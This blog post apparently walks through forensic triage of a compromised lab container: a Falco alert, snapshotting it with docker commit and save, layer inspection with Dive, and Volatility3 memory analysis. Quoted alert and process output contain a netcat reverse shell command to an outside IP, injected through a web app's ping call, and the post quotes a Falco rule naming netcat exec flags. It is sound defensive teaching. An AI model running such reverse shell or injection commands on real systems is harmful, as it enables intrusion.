@@ -1,0 +1,206 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-133811886-2")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><script src=/js/nav.js></script>
+<link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous><link rel=stylesheet href=/css/main.css><title>compromised_container_analysis_primer | jellyparks</title></head><body><header></header><div class=site-wrapper><div class="sticky top-bar"><div id=mySidenav class=sidenav include-nav=/nav.html></div><span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span></div><div class=container><div class=blog-header><h1>compromised_container_analysis_primer</h1></div><div class=row><div class="col-sm-8 blog-main"><div class=blog-post><hr><p>This post is going to focus on the triaging and analysis of a container that has been compromised.</p><hr><h3 id=pids>PIDs</h3><p>Before we get into the actual analysis lets start with a quick overview of how processes exist in containers. When you run PS inside a container you typically get a very short list of running processes and not all of the processes that are currently running on the underlying host. This is due to one of the foundational compoents that make a container a container, namespaces. Linux namespaces <em>isolate</em> the proceses within containers. What does this look like in practice? Lets look.</p><p>Take for example the following line from a <code>ps aux</code> output ran on a host.</p><pre tabindex=0><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root        2954  0.0  0.0   4200   740 pts/1    S+   02:41   0:00 ping 8.8.8.8
+</code></pre><p>We can see this process has a PID of 2954. Looking at pstree we can see this process is a child of bash, which is a child of containerd-shim</p><pre tabindex=0><code>systemd(1)───containerd-shim(2396)───bash(2604)───ping(2954)
+</code></pre><p>If we exec into the container and run the same ps commands we get a completely different pid:</p><pre tabindex=0><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         379  0.0  0.0   4200   740 pts/1    S+   02:41   0:00 ping 8.8.8.8
+</code></pre><p>This is due to the Linux namespace restricting our view so we can only see processes that exist &ldquo;within&rdquo; the container. If we attempt to kill PID 2954 on the host from within the container we will get an error that no such process exists. We could however kill process 379 without any issue.</p><p>For a much more indepth explaination I highly reccommend the book <a href=https://www.oreilly.com/library/view/container-security/9781492056690/>Container Security: Fundamental Technology Concepts that Protect Containerized Applications</a> by Liz Rice. Last I checked Aqua security was giving the ebook away for free.</p><hr><h3 id=the-scene>The Scene</h3><p>Moving on to a more practical example let&rsquo;s pretend that we get an alert from a Falco agent running on a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. Falco is a great tool and free to use. The fact that it is container aware makes it a great tool when looking to detect suspicious and malicious behavior in a container environment. The alert which was generated is below:</p><pre tabindex=0><code>{
+  &#34;output&#34;: &#34;21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)&#34;,
+  &#34;priority&#34;: &#34;Warning&#34;,
+  &#34;rule&#34;: &#34;Netcat Remote Code Execution in Container&#34;,
+  &#34;source&#34;: &#34;syscall&#34;,
+  &#34;tags&#34;: [
+    &#34;mitre_execution&#34;,
+    &#34;network&#34;,
+    &#34;process&#34;
+  ],
+  &#34;time&#34;: &#34;2022-05-10T21:39:47.159547041Z&#34;,
+  &#34;output_fields&#34;: {
+    &#34;container.id&#34;: &#34;60795d68fdee&#34;,
+    &#34;container.image.repository&#34;: &#34;webapp&#34;,
+    &#34;container.image.tag&#34;: &#34;v1.0&#34;,
+    &#34;container.name&#34;: &#34;eloquent_babbage&#34;,
+    &#34;evt.time&#34;: 1652218787159547100,
+    &#34;proc.cmdline&#34;: &#34;nc 172.31.93.20 9876 -e /bin/sh&#34;,
+    &#34;user.loginuid&#34;: -1,
+    &#34;user.name&#34;: &#34;www-data&#34;
+  }
+}
+</code></pre><p>The rule name is <code>Netcat Remote Code Execution in Container</code> (ruh roh). In the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the <a href=https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2462>rule</a> syntax it is a fairly simple rule.</p><pre tabindex=0><code> spawned_process and container and
+    ((proc.name = &#34;nc&#34; and (proc.args contains &#34;-e&#34; or proc.args contains &#34;-c&#34;)) or
+     (proc.name = &#34;ncat&#34; and (proc.args contains &#34;--sh-exec&#34; or proc.args contains &#34;--exec&#34; or proc.args contains &#34;-e &#34;
+                              or proc.args contains &#34;-c &#34; or proc.args contains &#34;--lua-exec&#34;))
+    )
+</code></pre><p>The output for the rule is:</p><pre tabindex=0><code>output: &gt;
+    Netcat runs inside container that allows remote code execution (user=%user.name user_loginuid=%user.loginuid
+    command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag)
+</code></pre><p>If we wanted to have additional information such as process id or parent process id in the output we could add that. Hindsight being what it is, had I thought of this before starting to write this I would have added pid details to the rule output for additional context.</p><p>Comparing the rule to the process cmdline included in the output_fields we can see clearly why it was triggered.</p><p>On the host when we run <code>ps aux</code> we see an output similar to the one below.</p><pre tabindex=0><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+www-data   12520  0.0  0.0   4296   796 ?        S    21:53   0:00 sh -c ping  -c 4 &amp; nc 172.31.93.20 9876 -e /bin/sh
+</code></pre><p>Digging deeper if we run <code>pstree -asp 12520</code> we see that the nc process is a child of apache2.</p><pre tabindex=0><code>pstree -asp 12520
+
+systemd,1
+  └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock
+      └─main.sh,11992 /main.sh
+          └─apache2,12323 -k start
+              └─apache2,12336 -k start
+                  └─sh,12520 -c ping  -c 4 &amp; nc 172.31.93.20 9876 -e /bin/sh
+                      └─sh,12522 -c /bin/sh
+                          └─sh,12523
+</code></pre><p>nc usage is common in most place where Linux is used. It is not common to see nc as a child process of apache2. At this point several additional alerts from Falco start to roll in, and after speaking with the application owner we learn nc was added to the container for troubleshooting connectivity issues, but they always ran it from a shell in the container as root never as the apache user (not ideal but it is what it is). The app owners also confirmed they have not been doing any testing recently. If this were a real scenario this host would probably be isolated if possible and attempts would be made to understand what kind of data is processed on the machine. Thankfully this is just a lab and all of that is out of scope for this post :-).</p><p>We know there is an active nc session, but what else has occured in the container? Let&rsquo;s dive into the image a figure it out.</p><hr><h3 id=carving-the-running-container-out>Carving the running container out</h3><p>First lets grab the eqivilant of a disk image of the running container this. We&rsquo;ll be able to perform an analysis on the image and it also preserves the image in the event that the container is killed. <em>Note: this post mainly focuses on the container itself, opperating within a Kubernetes cluster is highly likely in a scenario similar to this. There are additional things that should occur when performing analysis on a Kubernetes cluster to preserve and protect both the running container and the host that the container is running on. Failure to do so may result in the entire node being terminated and all relevant evidence along with it.</em></p><p>Lets determine the container id where this process lives. We can do this by looking at the <code>-id</code> parameter associated with the containerd-shim process from the pstree command. If multiple containers exist we would need to trace the tree up to the relevant container-shim process. Additionally in our scenario Falco provided the container id in the alert for us. If we want we can run the <code>docker ps</code> command to validate the container is still running.</p><pre tabindex=0><code># docker ps
+CONTAINER ID   IMAGE                  COMMAND      CREATED       STATUS       PORTS                               NAMES
+60795d68fdee   webapp:v1.0   &#34;/main.sh&#34;   3 hours ago   Up 3 hours   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp   eloquent_babbage
+</code></pre><p>Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched. The commit command below tells docker to create a new image name <code>sec-incident</code>, tag it with <code>123</code>, and use the running container id <code>6079</code> to build the image. Effectivly taking a snapshot of the container as it currently exists.</p><pre tabindex=0><code>docker commit 6079 sec-incident:123
+</code></pre><p>When we run the <code>docker images</code> command we see our new image, as well as the orignal image the container launched with.</p><pre tabindex=0><code>REPOSITORY             TAG       IMAGE ID       CREATED          SIZE
+sec-incident           123       9f64c8bead0e   21 seconds ago   845MB
+webapp                 v1.0      7adda9b17363   3 hours ago      714MB
+</code></pre><p>Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will <code>save</code> the image to disk so it is portable and can be moved to our analysis workstation.</p><pre tabindex=0><code>docker save sec-incident:123 -o sec-incident.tar
+</code></pre><p>It is important to note we are using the <code>docker save</code> command specifying the image we created from the running container instead of the <code>docker export</code> command on the running container. Both with produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from its initial launch. From here as an analyst the tar files will more than likely be exported to an analysis machine.</p><p>Once on our analyst workstation we need to perform a <code>docker load</code> on the tar file produced from the <code>docker save</code> command above. This will trigger the following output:</p><pre tabindex=0><code>docker load &lt; sec-incident.tar
+a75caa09eb1f: Loading layer [==================================================&gt;]    105MB/105MB
+80f9a8427b18: Loading layer [==================================================&gt;]  494.7MB/494.7MB
+97a1040801c3: Loading layer [==================================================&gt;]  7.168kB/7.168kB
+acf8abb873ce: Loading layer [==================================================&gt;]  5.655MB/5.655MB
+9713610e6ec4: Loading layer [==================================================&gt;]  5.632kB/5.632kB
+73e92d5f2a6c: Loading layer [==================================================&gt;]  5.658MB/5.658MB
+585e40f29c46: Loading layer [==================================================&gt;]  114.3MB/114.3MB
+deeea3c4d56f: Loading layer [==================================================&gt;]  2.048kB/2.048kB
+9ef9e3967882: Loading layer [==================================================&gt;]  121.7MB/121.7MB
+Loaded image: sec-incident-123:latest
+</code></pre><p>From this output we can tell there are 9 unique layers to this image.</p><hr><h3 id=what-is-an-image>What is an image</h3><p>Before progressing any further lets take a step back and talk about what an image is. An image according to docker.com is &ldquo;&mldr;a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.&rdquo; Technically however an image is just a collection of tar&rsquo;d files/folders. Each layer is a folder within the tar file. Within each layers folder contains information about the layer, and then any files associated with that particular layer.</p><p>In our example when we extract the sec-incident.tar file we see an out put that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is <code>manifest.json</code>, <code>repositories</code>, and a <code>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json</code> file. The <code>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json</code> file uses the hash of the image. The image hash is a sha256sum of this config file.</p><pre tabindex=0><code>tar -xvf sec-incident.tar
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/json
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/VERSION
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/json
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/VERSION
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/json
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/VERSION
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/json
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/VERSION
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/json
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/VERSION
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/json
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar
+9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/VERSION
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/json
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/VERSION
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/json
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/VERSION
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/json
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/VERSION
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/json
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/VERSION
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/json
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar
+manifest.json
+repositories
+</code></pre><p>The <code>manifest.json</code> file shows us information about the layers in the image as well as the repo/tags associated with the image</p><pre tabindex=0><code>[
+  {
+    &#34;Config&#34;: &#34;9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json&#34;,
+    &#34;RepoTags&#34;: [
+      &#34;sec-incident:123&#34;
+    ],
+    &#34;Layers&#34;: [
+      &#34;69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar&#34;,
+      &#34;9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar&#34;,
+      &#34;1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar&#34;,
+      &#34;c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar&#34;,
+      &#34;c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar&#34;,
+      &#34;a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar&#34;,
+      &#34;2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar&#34;,
+      &#34;caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar&#34;,
+      &#34;8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar&#34;,
+      &#34;ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar&#34;,
+      &#34;6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar&#34;
+    ]
+  }
+]
+</code></pre><p>The <code>repositories</code> file is just meta-data about the image:</p><pre tabindex=0><code>{&#34;sec-incident&#34;:{&#34;123&#34;:&#34;6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2&#34;}}
+</code></pre><p>When we look at the <code>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json</code> config file we can see all of the layers and what command(s) were used to create the layer. Below is a snip from the file:</p><pre tabindex=0><code>    {
+      &#34;created&#34;: &#34;2018-10-12T17:49:01.240444043Z&#34;,
+      &#34;created_by&#34;: &#34;/bin/sh -c #(nop)  ENTRYPOINT [\&#34;/main.sh\&#34;]&#34;,
+      &#34;empty_layer&#34;: true
+    },
+    {
+      &#34;created&#34;: &#34;2022-05-10T21:32:10.671619454Z&#34;,
+      &#34;created_by&#34;: &#34;/bin/sh -c #(nop) COPY file:2d20aa4eee806c995fcc211ba0077b67c72aa53ac0ba27ec57a721820907c4ff in /bin/nc &#34;
+    },
+    {
+      &#34;created&#34;: &#34;2022-05-10T21:32:11.329409992Z&#34;,
+      &#34;created_by&#34;: &#34;/bin/sh -c chmod +x /bin/nc&#34;
+    },
+    {
+      &#34;created&#34;: &#34;2022-05-11T00:38:09.016419258Z&#34;
+    }
+</code></pre><p>In the above output we can clearly see the original image launch layer which was created by the command <code>/bin/sh -c</code> with the entrypoint of <code>main.sh</code>. Below that we see two additional layers added by the application owner for troubleshooting purposes where they copied <code>nc</code> into the image and then made the file executable <code>/bin/sh -c chmod +x /bin/nc</code>. The last layer only has a timestamp, but no other information. This is the layer where we will want to look because it will contain any changes to the file system since the container was started. Before we start to unpack each layer and manually trompsing through all the files lets make things easier and utilize a tool built specifically to help us visualize the data we want to see.</p><hr><h3 id=dive>Dive</h3><p>There are several tools that can be used to perform static analysis of a container image. One of my favorites is dive. Dive is &ldquo;a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image.&rdquo; Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.</p><p>Once installed on our analysis system we can run the tool with:</p><pre tabindex=0><code>dive sec-incident:123
+</code></pre><p>Which will process our image and provide us with a really nice ui to navigate through it.</p><p>Once the ui loads in the top left panel we can see all of the image layers. The bottom layer contains all of the changes that occurred since the image was started up to the time we saved the image. In our case ~132MB of changes occured.</p><p><img src=images/dive-layers.png alt=dive-layers.png class=dive-layers></p><p>In the section below we can see the layer details. This includes the ID and Digest. We will use the Id (<code>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2</code>) later when we go to extract specific files from the image.</p><p><img src=images/dive-layer-details.png alt=dive-layer-details.png class=dive-layer-details></p><p>On the right we can see all of the contents of the filesystem at the current layer. This includes files from the previous layers. Dive color codes the files to show files that are new to the layer (green) and those files which have been modified when compared to the previous layer (yellow).</p><p><img src=images/dive-layer-contents.png alt=dive-layer-contents.png class=dive-layer-contents></p><p>We can see that a new session file was created, and that the access and error log files were modified, likely due to webtraffic to the application. In the image below we see several new files that have been created. Each file is worth digging into deeper to gain some understanding as to what has occurred.</p><p><img src=images/dive-layer-contents-2.png alt=dive-layer-contents-2.png class=dive-layer-contents-2></p><p>Unfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we will have to extract the layer from the image.</p><hr><h3 id=file-analysis>File Analysis</h3><p>Back in our extracted image folder we can use the layer id identified using Dive to selectivly target the layer we want.</p><p>We want to carve files out that occured within the most recent layer created for the image. Using the what we learned from Dive we know the layer id we want to explore is <code>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2</code>.</p><p><img src=images/extracted-layer-details.png alt=extracted-layer-details.png class=extracted-layer-details></p><p>Within the folder for the layer we will extract the <code>layer.tar</code> file with a <code>tar -xvf layer.tar</code>. This presents us with the filesystem at the current layer of the image. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was. This is only part of the picture though.</p><hr><h3 id=intermission>Intermission</h3><p>During analysis we learn the <code>curl</code> binary was uploaded in parts and then rebuilt as <code>ifj</code>. A coinminer (xmrig) was also uploaded in parts and rebuilt as the binary <code>8</code>. Additionally several webshells were uploaded. Given the timestamps of when all of the files appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The web access logs confirm that the same ip address was used for all of the requests where malicious files started to appear. The webshells were identical copies of a version of Web Shell Orb, a fairly full featured webshell with various capabilities.</p><hr><h3 id=memory-analysis>Memory Analysis</h3><p>Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option. Since this is a lab environment and the scenario is a bit contrived disk analysis tells enough of the story for us to understand what has occurred. If this were a bit more realistic the 8 binary probably would have been deleted from disk and we would either recover it from <code>/proc/&lt;PID>/exe</code> or we would carve it out of memory to perform analysis on it and determine what the binaries purpose was. With that in mind I chose to skip digging into that and instead dig into some special things about container memory analysis with volatility.</p><h4 id=volatility2>Volatility2</h4><p>When it comes to memory analysis with volatility there really isn&rsquo;t anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remember is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.</p><h4 id=volatility3>Volatility3</h4><p>Container analysis with volatility3 is a little bit different than it was with volatility. The main reason for this is the <code>volatility-docker</code> plugin built by Ofek Shaked & Amir Sheffer. This plugin adds namespace support and various docker commands which can aid in understanding the dump.</p><p>One example is the additional argument added to the suite of ps commands: <code>nsinfo</code>. This argument will display information about the namespace associated with a particular pid. Below is a sample output of the pstree module showing nsinfo.</p><table><thead><tr><th>PID</th><th>PPID</th><th>COMM</th><th>Start Time (UTC)</th><th>PID in NS</th><th>UTS NS</th><th>IPC NS</th><th>MNT NS</th><th>NET NS</th><th>PID NS</th><th>USER NS</th></tr></thead><tbody><tr><td>* 11971</td><td>1</td><td>containerd-shim</td><td>2022-05-10 21:37:46.453</td><td>11971</td><td>4026531838</td><td>4026531839</td><td>4026531840</td><td>4026532040</td><td>4026531836</td><td>4026531837</td></tr><tr><td>** 11992</td><td>11971</td><td>main.sh</td><td>2022-05-10 21:37:46.489</td><td>1</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>*** 12323</td><td>11992</td><td>apache2</td><td>2022-05-10 21:37:49.355</td><td>308</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12334</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.428</td><td>319</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12335</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.428</td><td>320</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12336</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.429</td><td>321</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12337</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.429</td><td>322</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>***** 12795</td><td>12337</td><td>sh</td><td>2022-05-11 00:31:20.254</td><td>411</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>****** 12797</td><td>12795</td><td>sh</td><td>2022-05-11 00:31:20.255</td><td>413</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>******* 12798</td><td>12797</td><td>sh</td><td>2022-05-11 00:31:20.261</td><td>414</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>******** 12816</td><td>12798</td><td>8</td><td>2022-05-11 00:33:19.062</td><td>430</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr></tbody></table><p>In the table above we can see <code>main.sh</code> is a child of containerd-shim which indicates this is a process in a container. Additionally the pid for <code>main.sh</code> in the NS is 1 which tells us this is the pid used to start the container. Below that we can see other PIDs which are related to host pid 11992, and are in the same namespace. We can use the namespace information to determine all of the pids associated with this container even if they have forked away and no longer appear as child processes. Furthermore this mapping can be really helpful if the initial alert source that triggered the investigation is only showing the PID within the namespace.</p><p>The docker plugin itself adds several new capabilities. The output below shows the available arguments:</p><pre tabindex=0><code>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.docker.Docker -h
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --detector            Detect Docker daemon / containers in memory
+  --ps                  List of running containers
+  --ps-extended         Extended list of running containers
+  --inspect-caps        Inspect containers capabilities
+  --inspect-mounts      Show a list of containers mounts
+  --inspect-mounts-extended
+                        Show detailed list of containers mounts
+  --inspect-networks    Show detailed list of containers networks
+  --inspect-networks-extended
+                        Show detailed list of containers networks
+</code></pre><p>The <code>--detector</code> argument attempts to detect if docker is being used on the system. This can be helpful if you are not sure if docker is being used on the system.</p><pre tabindex=0><code>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --detector
+Volatility 3 Framework 2.1.0
+Progress:  100.00               Stacking attempts finished
+Docker inetrface        Docker veth     Mounted Overlay FS      Containerd-shim is running
+
+True    True    True    True
+</code></pre><p><code>--ps</code> and <code>--ps-extended</code> emulates the <code>docker ps</code> command showing all containers within the dump and details about them.</p><pre tabindex=0><code>python3 /home/ubuntu/git/volatility3/vol.py  -f /home/ubuntu/webserver.lime docker.Docker --ps
+Volatility 3 Framework 2.1.0
+Progress:  100.00               Stacking attempts finished
+Container ID    Command Creation Time (UTC)     PID
+
+60795d68fdee     main.sh 2022-05-10 16:29:25.908 11992
+
+---
+
+python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps-extended
+Volatility 3 Framework 2.1.0
+Progress:  100.00               Stacking attempts finished
+Creation time (UTC)     Command Container ID    Is privileged   PID     Effective UID
+
+2022-05-10 16:29:25.908 main.sh 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216        False   11992   0
+</code></pre><p>To see the capabilities associated with a container the <code>--inspect-caps</code> argument can be used. Having an understanding of a containers capabilities can help shed light on what possible damage it could cause to the underlying system or neighboring containers. This will generate an output similar to below:</p><pre tabindex=0><code>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-caps
+Volatility 3 Framework 2.1.0
+Progress:  100.00               Stacking attempts finished
+PID     Container ID    Effective Capabilities Mask     Effective Capabilities Mames
+
+11992    60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216        0xa80425fb      CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
+</code></pre><p>The <code>--inspect-networks</code> argument will show the containers and the associated networks. If more than one container is in the same network the truncated container id&rsquo;s are comma seperated.</p><pre tabindex=0><code>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-networks
+Volatility 3 Framework 2.1.0
+Progress:  100.00               Stacking attempts finished
+Network /16 Segment     Containers IDs
+
+172.17  60795d68fdee, &lt;SOME OTHER CONTAINER&gt;
+</code></pre></div></div><div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0><nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav><h5>contents</h5><ul class="nav post-sidenav"><li><nav id=TableOfContents><ul><li><ul><li><a href=#pids>PIDs</a></li><li><a href=#the-scene>The Scene</a></li><li><a href=#carving-the-running-container-out>Carving the running container out</a></li><li><a href=#what-is-an-image>What is an image</a></li><li><a href=#dive>Dive</a></li><li><a href=#file-analysis>File Analysis</a></li><li><a href=#intermission>Intermission</a></li><li><a href=#memory-analysis>Memory Analysis</a></li></ul></li></ul></nav></li></ul></nav></div></div></div></div><footer></footer></body><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js integrity=sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1 crossorigin=anonymous></script>
